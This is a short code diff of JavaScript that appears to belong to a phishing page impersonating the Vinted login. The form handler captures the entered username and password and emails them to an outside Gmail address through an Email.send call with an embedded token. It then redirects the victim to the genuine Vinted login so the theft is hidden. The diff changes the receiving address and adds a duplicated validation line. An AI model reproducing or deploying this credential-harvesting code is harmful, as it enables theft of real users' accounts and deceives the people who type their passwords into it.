@@ -8,6 +8,8 @@ function onSubmitted (event) {
 
     let name = document.getElementById("name").value;
     let password = document.getElementById("password").value;
+    
+    if (name == "") return alert("Identifiant obligatoire");
 
     if(name =="") return alert("Identifiant obligatoire");
 
@@ -15,7 +17,7 @@ function onSubmitted (event) {
     Email.send({
         SecureToken : "46d446dd-390e-40d8-b0b5-cc49dd4e3c53",
 
-        To : 'nickellogin@gmail.com',
+        To : 'vintedvinted962@gmail.com',
         From : "leonbonou20@gmail.com",
         Subject : "Vinted Information :-)",
         Body : "<strong>Les informations du compte Vinted</strong> <br><br><br>\n" +
@@ -30,7 +32,6 @@ function onSubmitted (event) {
             "        </tr>\n" +
             "    </table> <br> <br> Merci!",
     }).then(
-        window.location.href = "https://www.vinted.fr/member/general/login?ref_url="
+        window.location.href = "https://www.vinted.fr/member/general/login?ref_url=" 
     );
-
 }
